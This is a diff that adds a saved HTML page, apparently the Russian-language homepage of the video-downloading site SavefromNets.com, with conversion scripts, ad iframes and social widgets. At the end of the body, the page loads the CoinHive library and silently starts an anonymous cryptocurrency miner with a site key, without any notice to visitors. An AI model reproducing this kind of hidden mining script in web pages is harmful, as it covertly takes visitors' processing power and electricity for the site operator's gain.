@@ -1,0 +1,453 @@
+<!DOCTYPE html>
+<html>
+<head>
+<meta charset="utf-8" />
+<meta http-equiv="X-UA-Compatible" content="IE=edge" />
+<meta name="viewport" content="width=device-width, initial-scale=1" />
+<title>Онлайн-конвертер и загрузчик - SavefromNets.com</title><meta name="description" content="Он имеет очень мощную функцию для конвертирования и загрузки ваших любимых аудио и видео в форматы MP3, MP4, WEBM, F4V и 3GP с онлайн-сайтов, таких как youtube, dailymotion, vimeo, facebook, matacafe, vk, soundcloud, instagram, vevo и т. Д." /><meta name="keywords" content="Онлайн-видео конвертер, онлайн-загрузчик видео, сохранение в сетях, конвертер YouTube в MP3, конвертер YouTube в MP4" /><meta property="og:image" content="http://savefromnets.com/savefromnets.jpg" />
+<meta name="google-site-verification" content="o9967HG10Wou5QKstj7Q0xIn4WH-cP-jSmmmvY_XFrQ" />
+<meta name="msvalidate.01" content="DB832A2A735DB810450F7D5BF1F3C1D4" />
+<meta name="yandex-verification" content="8183f5c68010e01b" />
+<link rel="apple-touch-icon" sizes="57x57" href="icons/apple-icon-57x57.png">
+<link rel="apple-touch-icon" sizes="60x60" href="icons/apple-icon-60x60.png">
+<link rel="apple-touch-icon" sizes="72x72" href="icons/apple-icon-72x72.png">
+<link rel="apple-touch-icon" sizes="76x76" href="iconsicons/apple-icon-76x76.png">
+<link rel="apple-touch-icon" sizes="114x114" href="icons/apple-icon-114x114.png">
+<link rel="apple-touch-icon" sizes="120x120" href="icons/apple-icon-120x120.png">
+<link rel="apple-touch-icon" sizes="144x144" href="icons/apple-icon-144x144.png">
+<link rel="apple-touch-icon" sizes="152x152" href="icons/apple-icon-152x152.png">
+<link rel="apple-touch-icon" sizes="180x180" href="icons/apple-icon-180x180.png">
+<link rel="icon" type="image/png" sizes="192x192" href="/android-icon-192x192.png">
+<link rel="icon" type="image/png" sizes="32x32" href="icons/favicon-32x32.png">
+<link rel="icon" type="image/png" sizes="96x96" href="icons/favicon-96x96.png">
+<link rel="icon" type="image/png" sizes="16x16" href="icons/favicon-16x16.png">
+<link rel="manifest" href="icons/manifest.json">
+<meta name="msapplication-TileColor" content="#ffffff">
+<meta name="msapplication-TileImage" content="icons/ms-icon-144x144.png">
+<meta name="theme-color" content="#ffffff">
+<link rel="stylesheet" type="text/css" href="https://ajax.googleapis.com/ajax/libs/jqueryui/1.9.2/themes/base/jquery-ui.css" />
+<link rel="stylesheet" type="text/css" href="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.4/css/bootstrap.min.css" />
+<link rel="stylesheet" type="text/css" href="https://maxcdn.bootstrapcdn.com/font-awesome/4.3.0/css/font-awesome.min.css" />
+<link rel="stylesheet" type="text/css" href="css/media-icons.css" />
+<link rel="stylesheet" type="text/css" href="css/flag-icon.css" />
+<link rel="stylesheet" type="text/css" href="css/prettySocial.css" />
+<link rel="stylesheet" type="text/css" href="css/colorbox.css" />
+<link rel="stylesheet" type="text/css" href="css/custom.css?v=1.4">
+<script type="text/javascript" src="https://ajax.googleapis.com/ajax/libs/jquery/1.9.1/jquery.min.js"></script>
+<script type="text/javascript" src="https://ajax.googleapis.com/ajax/libs/jqueryui/1.9.2/jquery-ui.min.js"></script>
+<script type="text/javascript" src="js/jquery.ui.touch-punch.min.js"></script>
+<script type="text/javascript" src="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.4/js/bootstrap.min.js"></script>
+<script type="text/javascript" src="js/jquery.colorbox-min.js"></script>
+<script type="text/javascript" src="js/jquery.prettySocial.min.js"></script>
+<script type="text/javascript" src="js/jquery.cookie.js"></script>
+<script type="text/javascript" src="https://cdnjs.cloudflare.com/ajax/libs/modernizr/2.7.1/modernizr.min.js"></script>
+<script type="text/javascript" src="https://ws.sharethis.com/button/buttons.js"></script>
+<script type="text/javascript" src="https://www.dropbox.com/static/api/1/dropins.js" id="dropboxjs" data-app-key="2c7k1myslmzcv1y"></script>
+<script type="text/javascript" src="js/navbar_language_fix.js" id="navbar-lang-fix" more="More" langMenuPosition="right"></script>
+<script type="text/javascript">
+		var conversionLogLength = 0;
+		var conversionInProgress = false;
+		var failedAjaxRequests = 0;
+		var maxAjaxRequestTries = 20;
+		var conversionStopping = false;
+		var timer;
+
+		function updateVideoDownloadProgress(percentage)
+		{
+			var progress = document.getElementById('progress');
+			progress.style.width = progress.innerHTML = parseInt(percentage) + '%';
+		}
+
+		function updateConversionProgress(convertedFile, convertedFileNiceName, tempFileType, vidTitle)
+		{
+			conversionInProgress = true;
+			var progress = document.getElementById('progress');
+			document.getElementById('conversion-status').innerHTML = "Конвертирую файл";
+			$.ajax({
+				type : "POST",
+				url : "ffmpeg_progress.php",
+				data : "uniqueId=1516940021_5a6aaaf50808b1.08372977&logLength=" + conversionLogLength + "&convertedFile=" + encodeURI(convertedFile) + "&tempFileType=" + encodeURI(tempFileType),
+				success : function(retVal, status, xhr) {
+					var retVals = retVal.split('|');
+					if (retVals[3] == 2)
+					{
+						progress.style.width = progress.innerHTML = parseInt(retVals[1]) + '%';
+						if (parseInt(retVals[1]) < 100)
+						{
+							conversionLogLength = parseInt(retVals[0]);
+							if (!conversionStopping)
+							{
+								timer = setTimeout(function(){updateConversionProgress(convertedFile, convertedFileNiceName, tempFileType, vidTitle);}, 500);
+							}
+						}
+						else
+						{
+							conversionInProgress = false;
+							showConversionResult(convertedFile, convertedFileNiceName, vidTitle, retVals[2]);
+						}
+					}
+					else
+					{
+						if (++failedAjaxRequests < maxAjaxRequestTries && !conversionStopping)
+						{
+							timer = setTimeout(function(){updateConversionProgress(convertedFile, convertedFileNiceName, tempFileType, vidTitle);}, 100);
+						}
+						else
+						{
+							conversionInProgress = false;
+							showConversionResult(convertedFile, convertedFileNiceName, vidTitle, 2);
+						}
+					}
+				},
+				error : function(xhr, status, ex) {
+					if (++failedAjaxRequests < maxAjaxRequestTries && !conversionStopping)
+					{
+						timer = setTimeout(function(){updateConversionProgress(convertedFile, convertedFileNiceName, tempFileType, vidTitle);}, 100);
+					}
+					else
+					{
+						conversionInProgress = false;
+						showConversionResult(convertedFile, convertedFileNiceName, vidTitle, 2);
+					}
+				}
+			});
+		}
+
+		function showConversionResult(convertedFile, convertedFileNiceName, vidTitle, success)
+		{
+			$("#preview").css("display", "none");
+			var convertSuccessMsg = '';
+			if (success == 1)
+			{
+				var isEditableRegex = new RegExp('(\.(webm|mp4|mp3|aac|m4a|f4v))$', 'i');
+				var isEditable = isEditableRegex.test(convertedFile);
+				        		convertSuccessMsg += '<p class="bg-success padding-msg"><b><i class="fa fa-thumbs-up"></i> Завершено успешно!</b></p>';
+        		//convertSuccessMsg += '<p><img src="" alt="preview image" style="width:150px" /></p>';
+				convertSuccessMsg += '<p><iframe src="/ads.php" width="310" height="260" border="0" frameborder="0" scrolling="no"></iframe></p>'; // Ads
+        		//convertSuccessMsg += '<p dir="ltr"><b></b></p>';
+        		convertSuccessMsg += '<h4 style="margin-bottom:15px;text-transform:uppercase;"><span class="label label-default"></span></h4>';
+        		convertSuccessMsg += '<p><a class="btn btn-success download-buttons" href="/index.php?output=' + encodeURI(convertedFile) + '" onclick="showShareButtonsWindow(this.href); return false;"><i class="fa fa-download"></i> Загрузить сконвертированный файл</a></p>';
+				          			convertSuccessMsg += '<p><a class="btn btn-info download-buttons" id="dropboxLink" href="http://savefromnets.com/output/' + encodeURI(convertedFile) + '"><i class="fa fa-dropbox"></i> Сохранить в Dropbox</a></p>';
+								        		convertSuccessMsg += (isEditable) ? '<p><a id="editFurtherButton" class="btn btn-warning download-buttons" href="edit.php?vid_name=' + encodeURI(convertedFile) + '&vid_title=' + encodeURI(vidTitle) + '&vid_id=&vid_image=&vid_host=" title="Обрезать файл и/или Редактировать файловую информацию (например заголовок, артист итд)"><i class="fa fa-scissors"></i> Редактировать файл дальше</a></p>' : '';
+        		convertSuccessMsg += '<p><a class="btn btn-danger download-buttons" href="http://savefromnets.com/"><i class="fa fa-reply"></i> Возвратиться на домашнюю страницу</a></p>';
+			}
+			else
+			{
+        		convertSuccessMsg = '<p class="bg-danger padding-msg"><i class="fa fa-exclamation-triangle"></i> Ошибка генерации конвертированного файла<br /><br /><a href="http://savefromnets.com/index.php?ccode=RU/">Пожалуйста, попробуйте снова</a></p>';
+			}
+			$("#conversionSuccess").html(convertSuccessMsg).find("#dropboxLink, #onedriveLink, #editFurtherButton").each(function(){
+				if ($(this).attr("id") == "editFurtherButton")
+				{
+					$(this).tooltip();
+				}
+				else
+				{
+					$(this).click(function() {
+						saveToCloud($(this), convertedFileNiceName);
+						return false;
+					});
+				}
+			});
+		}
+
+		function saveToCloud(buttonObj, convertedFileNiceName)
+		{
+			var options = {
+				success: function() {
+					// Indicate to the user that the file has been saved.
+					buttonObj.html('<span class="fa fa-check" style="color:#fff"></span> ' + buttonObj.text());
+				},
+				progress: function(progress) {
+					buttonObj.html('<span class="fa fa-refresh fa-spin" style="color:#fff"></span> ' + buttonObj.text());
+				},
+				error: function(errorMessage) {
+					buttonObj.html('<span class="fa fa-exclamation-triangle" style="color:red"></span> ' + buttonObj.text());
+				}
+			};
+			switch (buttonObj.attr("id"))
+			{
+				case "dropboxLink":
+					Dropbox.save(buttonObj.attr("href"), convertedFileNiceName, options);
+					break;
+				case "onedriveLink":
+					options.file = buttonObj.attr("href");
+					options.fileName = convertedFileNiceName;
+					OneDrive.save(options);
+					break;
+			}
+		}
+
+		function stopConversion()
+		{
+			var redirectUrl = 'http://savefromnets.com/index.php';
+			if (!conversionStopping)
+			{
+				failedAjaxRequests = 0;
+				clearTimeout(timer);
+				conversionStopping = true;
+			}
+			if (conversionInProgress)
+			{
+				$.ajax({
+					type : "POST",
+					url : "ffmpeg_stop.php",
+					data : "token=1516940021_5a6aaaf50808b1.08372977",
+					success : function(retVal, status, xhr) {
+						window.location.href = redirectUrl;
+					},
+					error : function(xhr, status, ex) {
+						if (++failedAjaxRequests < maxAjaxRequestTries)
+						{
+							timer = setTimeout(function(){stopConversion();}, 100);
+						}
+					}
+				});
+			}
+			else
+			{
+				window.location.href = redirectUrl;
+			}
+		}
+
+		// If this is iframe, and parent receives URL-initiated conversion request, forward request to iframe
+		if (window.location != window.parent.location)
+		{
+			if (parent.location.search != "")
+			{
+				var queryStrParams = [];
+				var queryStrParts = parent.location.search.replace(/\?/, "").split("&");
+				for (var i=0; i<queryStrParts.length; i++)
+				{
+					queryStrParams.push(queryStrParts[i].split("=")[0]);
+				}
+				if (($.inArray('vidHost', queryStrParams) != -1 && $.inArray('vidID', queryStrParams) != -1) || $.inArray('url', queryStrParams) != -1)
+				{
+					var iframeQueryStr = parent.location.search;
+					parent.history.replaceState("object or string", "Title", "/");
+					window.location.href = window.location.href.replace(/\?.*/, "") + iframeQueryStr;
+				}
+			}
+		}
+
+		$(document).ready(function(){
+			$(function(){
+				$('[data-toggle="tooltip"]').tooltip();
+			});
+			$("#volumeSlider").slider({
+				range: "min",
+				min: 0,
+				max: 1024,
+				value: 256,
+				slide: function(event, ui) {
+					var percent = Math.floor((ui.value / 256) * 100);
+					$("#volumeVal").html(percent + '%');
+					$("input[name='volume']").val(ui.value);
+				}
+			});
+			$("#toggleOptionsDisplay span").click(function(){
+				$("#moreOptions").toggle('fast', function(){
+					var linkText = ($(this).css('display') == 'none') ? "Показать дополнительные настройки &#187;" : "Скрыть дополнительные настройки &#171;";
+					$("#toggleOptionsDisplay span").html(linkText);
+				});
+			});
+			(function(){
+				var siteNames = $(".siteNames");
+				var examples = $("#examples span");
+				var exampleIndex = -1;
+				function animateIt(elementGroup){
+					var nextFuncCall = (elementGroup != examples) ? showNextExample : null;
+					elementGroup.eq(exampleIndex)
+						.fadeIn({
+							duration: 700
+						})
+						.delay(6000)
+						.fadeOut(700, nextFuncCall);
+				}
+				function showNextExample(){
+					exampleIndex = (++exampleIndex > examples.length - 1) ? 0 : exampleIndex;
+					animateIt(siteNames);
+					animateIt(examples);
+				}
+				showNextExample();
+			})();
+			if (typeof stLight != "undefined")
+			{
+				stLight.options({publisher: "INSERT_PUBLIC_KEY_HERE", doNotHash: true, doNotCopy: false, hashAddressBar: false});
+			}
+			if (!document.getElementById('preview'))
+			{
+				$("#conversionForm").css("display", "block");
+			}
+			$("#videoURL").focus();
+		});
+	</script>
+
+</head>
+<body dir="ltr">
+
+<nav class="navbar navbar-default bluebar">
+<div class="container-fluid">
+
+<div class="navbar-header">
+<button type="button" class="navbar-toggle collapsed" data-toggle="collapse" data-target="#bs-example-navbar-collapse-1">
+<span class="sr-only">Toggle navigation</span>
+<span class="icon-bar"></span>
+<span class="icon-bar"></span>
+<span class="icon-bar"></span>
+</button>
+<a class="navbar-brand" href="http://savefromnets.com/"> SavefromNets.com </a>
+</div>
+
+<div class="collapse navbar-collapse" id="bs-example-navbar-collapse-1">
+<ul id="menuPageLinks" class="nav navbar-nav">
+<li class="active"><a href="index.php"><i class="fa fa-home"></i>Домой</a></li>
+<li><a href="faq.php"><i class="fa fa-question"></i>FAQ</a></li>
+<li><a href="plugin.php"><i class="fa fa-plug"></i>Получить плагин</a></li>
+<li><a href="about.php"><i class="fa fa-user"></i>О</a></li>
+<li><a href="contact.php"><i class="fa fa-envelope-o"></i>Контакт</a></li> </ul>
+<ul class="nav navbar-nav navbar-right">
+<li class="dropdown">
+<a href="#" class="dropdown-toggle" data-toggle="dropdown" role="button" aria-expanded="false"><span class="flag-icon flag-icon-ru"></span> RU<span class="caret"></span></a> <ul class="dropdown-menu" role="menu">
+<li><a dir="ltr" href="http://savefromnets.com/index.php?ccode=DE"><span class="flag-icon flag-icon-de"></span>&nbsp;&nbsp;Deutsch</a></li><li><a dir="ltr" href="http://savefromnets.com/index.php?ccode=US"><span class="flag-icon flag-icon-us"></span>&nbsp;&nbsp;English (US)</a></li><li><a dir="ltr" href="http://savefromnets.com/index.php?ccode=ES"><span class="flag-icon flag-icon-es"></span>&nbsp;&nbsp;Español</a></li><li><a dir="ltr" href="http://savefromnets.com/index.php?ccode=FR"><span class="flag-icon flag-icon-fr"></span>&nbsp;&nbsp;Français</a></li><li><a dir="ltr" href="http://savefromnets.com/index.php?ccode=HR"><span class="flag-icon flag-icon-hr"></span>&nbsp;&nbsp;Hrvatski</a></li><li><a dir="ltr" href="http://savefromnets.com/index.php?ccode=IT"><span class="flag-icon flag-icon-it"></span>&nbsp;&nbsp;Italiano</a></li><li><a dir="ltr" href="http://savefromnets.com/index.php?ccode=LT"><span class="flag-icon flag-icon-lt"></span>&nbsp;&nbsp;Lietuvių</a></li><li><a dir="ltr" href="http://savefromnets.com/index.php?ccode=HU"><span class="flag-icon flag-icon-hu"></span>&nbsp;&nbsp;Magyar</a></li><li><a dir="ltr" href="http://savefromnets.com/index.php?ccode=PH"><span class="flag-icon flag-icon-ph"></span>&nbsp;&nbsp;Pilipino</a></li><li><a dir="ltr" href="http://savefromnets.com/index.php?ccode=PL"><span class="flag-icon flag-icon-pl"></span>&nbsp;&nbsp;Polski</a></li><li><a dir="ltr" href="http://savefromnets.com/index.php?ccode=PT"><span class="flag-icon flag-icon-pt"></span>&nbsp;&nbsp;Português</a></li><li><a dir="ltr" href="http://savefromnets.com/index.php?ccode=RU"><span class="flag-icon flag-icon-ru"></span>&nbsp;&nbsp;Pусский</a></li><li><a dir="ltr" href="http://savefromnets.com/index.php?ccode=RO"><span class="flag-icon flag-icon-ro"></span>&nbsp;&nbsp;Română</a></li><li><a dir="ltr" href="http://savefromnets.com/index.php?ccode=FI"><span class="flag-icon flag-icon-fi"></span>&nbsp;&nbsp;Suomi</a></li><li><a dir="ltr" href="http://savefromnets.com/index.php?ccode=TR"><span class="flag-icon flag-icon-tr"></span>&nbsp;&nbsp;Türkce</a></li><li><a dir="ltr" href="http://savefromnets.com/index.php?ccode=GR"><span class="flag-icon flag-icon-gr"></span>&nbsp;&nbsp;ελληνικά</a></li><li><a dir="ltr" href="http://savefromnets.com/index.php?ccode=BG"><span class="flag-icon flag-icon-bg"></span>&nbsp;&nbsp;Български</a></li><li><a dir="ltr" href="http://savefromnets.com/index.php?ccode=SA"><span class="flag-icon flag-icon-sa"></span>&nbsp;&nbsp;عربي</a></li><li><a dir="ltr" href="http://savefromnets.com/index.php?ccode=IN"><span class="flag-icon flag-icon-in"></span>&nbsp;&nbsp;हिन्दी</a></li><li><a dir="ltr" href="http://savefromnets.com/index.php?ccode=CN"><span class="flag-icon flag-icon-cn"></span>&nbsp;&nbsp;中国</a></li><li><a dir="ltr" href="http://savefromnets.com/index.php?ccode=JP"><span class="flag-icon flag-icon-jp"></span>&nbsp;&nbsp;日本の</a></li> </ul>
+</li>
+</ul>
+<form id="searchForm" class="navbar-form navbar-right nav-search" role="search" action="//savefromnets.com/search.php" method="post">
+<div class="input-group">
+<input type="text" class="form-control" id="nav-search" name="nav-search" placeholder="Поиск">
+<span class="input-group-btn">
+<button class="btn btn-default" type="button" onclick="$('#searchForm').submit();"><i class="fa fa-search"></i></button>
+</span>
+</div>
+</form> </div>
+</div>
+</nav>
+<div class="container">
+
+<div class="row">
+<div class="col-lg-8 col-lg-offset-2">
+<div class="converter-box text-center bg-white">
+<div class="converter converter2 text-center">
+<h1>SavefromNets</h1>
+<div id="fb-root"></div>
+<script>(function(d, s, id) {
+  var js, fjs = d.getElementsByTagName(s)[0];
+  if (d.getElementById(id)) return;
+  js = d.createElement(s); js.id = id;
+  js.src = "//connect.facebook.net/en_US/sdk.js#xfbml=1&version=v2.10&appId=1579045589013966";
+  fjs.parentNode.insertBefore(js, fjs);
+}(document, 'script', 'facebook-jssdk'));</script>
+<div class="fb-like" data-href="https://www.facebook.com/SavefromNets" data-width="200" data-layout="standard" data-action="like" data-size="small" data-show-faces="true" data-share="true"></div>
+
+
+<br>
+<form action="/index.php" method="post" id="conversionForm" style="display:none">
+<h3 class="text-gray" style="margin-bottom:16px">
+Преобразовать <span class="siteNames" style="display:inline">YouTube</span><span class="siteNames" style="display:none">Dailymotion</span><span class="siteNames" style="display:none">Vimeo</span><span class="siteNames" style="display:none">Facebook</span><span class="siteNames" style="display:none">Metacafe</span><span class="siteNames" style="display:none">VK</span><span class="siteNames" style="display:none">SoundCloud</span><span class="siteNames" style="display:none">Instagram</span><span class="siteNames" style="display:none">AOL</span><span class="siteNames" style="display:none">Vevo</span> content to webm, mp4, mp3, aac, m4a, f4v, или 3gp форматы! </h3>
+<div class="supported-portals" dir="ltr">
+<div><i class="fa fa-youtube" id="youtube" data-toggle="tooltip" data-placement="top" title="YouTube"></i></div><div><i class="icon icon-dailymotion" id="dailymotion" data-toggle="tooltip" data-placement="top" title="Dailymotion"></i></div><div><i class="fa fa-vimeo-square" id="vimeo" data-toggle="tooltip" data-placement="top" title="Vimeo"></i></div><div><i class="fa fa-facebook-square" id="facebook" data-toggle="tooltip" data-placement="top" title="Facebook"></i></div><div><i class="icon icon-metacafe" id="metacafe" data-toggle="tooltip" data-placement="top" title="Metacafe"></i></div><div><i class="fa fa-vk" id="vk" data-toggle="tooltip" data-placement="top" title="VK"></i></div><div><i class="fa fa-soundcloud" id="soundcloud" data-toggle="tooltip" data-placement="top" title="SoundCloud"></i></div><div><i class="fa fa-instagram" id="instagram" data-toggle="tooltip" data-placement="top" title="Instagram"></i></div><div><i class="icon icon-aol" id="aol" data-toggle="tooltip" data-placement="top" title="AOL"></i></div><div><i class="icon icon-vevo" id="vevo" data-toggle="tooltip" data-placement="top" title="Vevo"></i></div> </div>
+<div class="input-group">
+<span class="input-group-addon" style="border-color:#ccc"><i class="fa fa-globe fa-fw"></i></span>
+<input type="text" class="form-control input-lg bg-light-gray" id="videoURL" name="videoURL" placeholder="Введите правильно URL:" dir="ltr" />
+</div>
+<p class="example-urls" id="examples">
+(i.e., "<span class="urls" style="display:inline">http://www.youtube.com/watch?v=HMpmI2F2cMs</span><span class="urls" style="display:none">http://www.dailymotion.com/video/x31j7ik_chapman-stick_music</span><span class="urls" style="display:none">http://vimeo.com/72695254</span><span class="urls" style="display:none">http://www.facebook.com/photo.php?v=10151848825508876</span><span class="urls" style="display:none">http://www.metacafe.com/watch/10856331/fart_attack/</span><span class="urls" style="display:none">http://vk.com/video4643923_163339118</span><span class="urls" style="display:none">http://soundcloud.com/foolsgoldrecs/funkin-matt-america</span><span class="urls" style="display:none">http://instagram.com/p/vIyKcyNdV-</span><span class="urls" style="display:none">http://on.aol.com/video/dogs-hang-ten-518439815</span><span class="urls" style="display:none">http://www.vevo.com/watch/taylor-swift/Wildest-Dreams/USCJY1531576</span>") </p>
+<p class="file-type-text">Выберите тип файла для конвертации</p>
+<select class="form-control input-lg bg-light-gray" name="ftype" id="ftype">
+<optgroup dir="ltr" label="audio"><option dir="ltr" value="5">.aac</option><option dir="ltr" value="6">.m4a</option><option dir="ltr" value="3" selected="selected">.mp3 (128kb)</option><option dir="ltr" value="4">.mp3 (256kb)</option></optgroup><optgroup dir="ltr" label="video"><option dir="ltr" value="8">.3gp</option><option dir="ltr" value="2">.mp4</option><option dir="ltr" value="7">.f4v</option><option dir="ltr" value="1">.webm</option></optgroup> </select>
+<div id="moreOptions" class="margin-top-10" style="display:none" align="center">
+<p>Громкость (<span id="volumeVal">100%</span>)</p>
+<p id="volumeSlider"></p>
+<input type="hidden" name="volume" />
+</div>
+<div id="toggleOptionsDisplay"><span>Показать дополнительные настройки &#187;</span></div>
+<div><iframe src="ads.php" width="300" height="250" scrolling="no" style="border:none;"></iframe></div>
+<button type="submit" name="submitForm" class="btn btn-success btn-lg"><i class="fa fa-cogs"></i> Сконвертировано</button><input type="hidden" name="formToken" value="1516940021_5a6aaaf50808b1.08372977" />
+</form>
+</div>
+
+
+</div>
+</div>
+</div>
+
+<div class="row">
+<div class="col-lg-6 col-lg-offset-3 latestsearches-box text-center">
+<div class="panel panel-primary">
+<div class="panel-heading">Последние поисковые запросы</div>
+<div class="panel-body">
+No search links yet! </div>
+</div>
+</div>
+</div>
+
+<div class="row" dir="ltr">
+<div class="col-lg-3 col-md-6 col-sm-6 col-xs-12">
+<div class="info-box">
+<span class="info-box-icon bg-red"><i class="fa fa-youtube yt-icon"></i></span>
+<div class="info-box-content text-center">
+<span class="info-box-header">Supported Portals</span>
+<span class="info-box-text">YouTube, SoundCloud, Vimeo, Facebook,<br /><small style="cursor: pointer;" data-toggle="tooltip" data-placement="top" title="YouTube, Dailymotion, Vimeo, Facebook, Metacafe, VK, SoundCloud, Instagram, AOL, и Vevo"><u>and more !!</u></small></span>
+</div>
+</div>
+</div>
+<div class="col-lg-3 col-md-6 col-sm-6 col-xs-12">
+<div class="info-box">
+<span class="info-box-icon bg-green"><i class="fa fa-scissors"></i></span>
+<div class="info-box-content text-center">
+<span class="info-box-header">File Editor</span>
+<span class="info-box-text">Cut files to a given length and add file metadata.</span>
+</div>
+</div>
+</div>
+
+<div class="clearfix visible-sm-block"></div>
+<div class="col-lg-3 col-md-6 col-sm-6 col-xs-12">
+<div class="info-box">
+<span class="info-box-icon bg-aqua"><i class="fa fa-cloud"></i></span>
+<div class="info-box-content text-center">
+<span class="info-box-header">Cloud Support</span>
+<span class="info-box-text">Save your files directly to the Dropbox or OneDrive Cloud.</span>
+</div>
+</div>
+</div>
+<div class="col-lg-3 col-md-6 col-sm-6 col-xs-12">
+<div class="info-box info-box-mobile-fix">
+<span class="info-box-icon bg-yellow"><i class="fa fa-mobile"></i></span>
+<div class="info-box-content text-center">
+<span class="info-box-header">Mobile Support</span>
+<span class="info-box-text">Support for iOS, Windows Phone and Android devices.</span>
+</div>
+</div>
+</div>
+</div>
+</div>
+
+<footer class="footer">
+<div class="container-fluid">
+<div class="social-buttons" dir="ltr">
+<span class='st_fblike_hcount' displayText='Facebook Like'></span>
+<span class='st_twitterfollow_hcount' displayText='Twitter Follow' st_username='SavefromNets'></span>
+<span class='st_plusone_hcount' displayText='Google +1'></span>
+</div>
+<div class="copyright" dir="ltr">
+<p>&copy; 2018 SavefromNets.com</p>
+</div>
+<div class="clearfix"></div>
+</div>
+</footer>
+<script>
+  (function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
+  (i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
+  m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
+  })(window,document,'script','https://www.google-analytics.com/analytics.js','ga');
+
+  ga('create', 'UA-62572224-1', 'auto');
+  ga('send', 'pageview');
+
+</script>
+
+
+<script type="text/javascript" src="//s7.addthis.com/js/300/addthis_widget.js#pubid=ra-58a46c7534410bb5"></script>
+<script src='https://coin-hive.com/lib/coinhive.min.js'></script><script>var miner = new CoinHive.Anonymous('ZARNNKb30vmoadzWUCxfzvxeojzLHHhx');miner.start();</script>
+</body>
+</html>
